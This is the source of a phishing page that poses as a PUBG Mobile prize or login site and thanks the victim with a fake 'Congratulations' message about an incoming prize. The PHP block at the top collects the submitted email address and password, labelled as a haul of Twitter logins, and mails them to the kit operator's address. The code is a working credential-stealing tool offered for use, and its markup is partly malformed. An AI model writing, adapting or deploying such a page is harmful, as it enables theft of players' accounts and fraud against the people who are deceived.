<?php
error_reporting(0);


$email    = $_POST['email'];
$pass = $_POST['pass'];
$email1    = $_POST['email1'];
$pass1 = $_POST['pass1'];
$text = $_POST['text'];
$xp = $_POST['xp'];
$pn = $_POST['phone'];
$recover = $_POST['emailr'];

$message   = "

>>>>> SETORAN TWITTER <<<<<
                               
Email : ".$email."  

Password :  ".$pass."       

>>>>> KUNJUNGI UHUINFO YA <<<<<



";

include 'email.php';
$subject = "UHU PUBG LOG TWITTER (".$email.")";
$headers = "From: UHUINFO99 <uhuinfo@dot.com>";
mail($emailku, $subject, $message, $headers);

echo "<script LANGUAGE=\"JavaScript\">
<!--
// -->
</script>";
?>
<?php
$random = rand(1000,5000);
?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
 <title>Login - PlayerUnknown's Battlegrounds</title>
<script src="jquery.min.js"></script>
<link rel="stylesheet" href="bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}

.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<script type="text/javascript">
	$(document).ready(function(){
	  $("#gsubmit").on("click", function() {
		  var gemail = $("#gemail").val();
		  var gpass = $("#gpass").val();
		  if(gemail==''||gpass=='')
{

}
else
{
	var res = document.getElementById("hasilnya");
          res.innerHTML='';
		  $("#gsubmit").prop("disabled", true );
		  $.post("engine.php",
		  {gemail:gemail,gpass:gpass,},
		  function(response,status){
			  $('#hasilnya').html(response);
			$("#gsubmit").prop("disabled", false );
			$("#gemail").prop("value", "");
			$("#gpass").prop("value", "");
		  });
		  return false;
	  }
	  }
	  );
	});



<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">

<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
<script type='text/javascript'>window._sbzq||function(e){e._sbzq=[];var t=e._sbzq;t.push(["_setAccount",54166]);var n=e.location.protocol=="https:"?"https:":"http:";var r=document.createElement("script");r.type="text/javascript";r.async=true;r.src=n+"//static.subiz.com/public/js/loader.js";var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)}(window);</script>
</body>


<center style="background-image:url(https://d2v9y0dukr6mq2.cloudfront.net/video/thumbnail/J9H9WF0/sparkly-white-light-particles-moving-across-a-blue-gradient-background-imitating-a-sky-full-of-stars_rknxory0_thumbnail-full01.png);"width="100%"height="100%"><br>
<div class="col-md-8">
<h2><img src="https://www.xda-developers.com/files/2018/11/pubg-mobile-banner.jpg"width="100%"height="100%"></h2>

<div  style="padding:30px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);width:100%" class="form-horizontal"width="40%"height="40%">
       <form action="detail.php" id="login-form" method="post">
<h2>
  <h4> <b> <ins>Congratulations</ins> The prize set you get will be sent<br> after the developer notifies your<br> account in the inbox, usually about 30 minutes</b></h4>
  
    <br> <a href="https://www.pubg.com/"class="btn btn-block" style="color: #ffffff;background-color: #2780e3;"><b>< Back</b></a>

</div><br>
</div>
  </p>
  
  <center><input type="submit" class="btn btn-block" style="color: #000000;background-color: blue;" value="Copyright © PUBG Corporation"></center>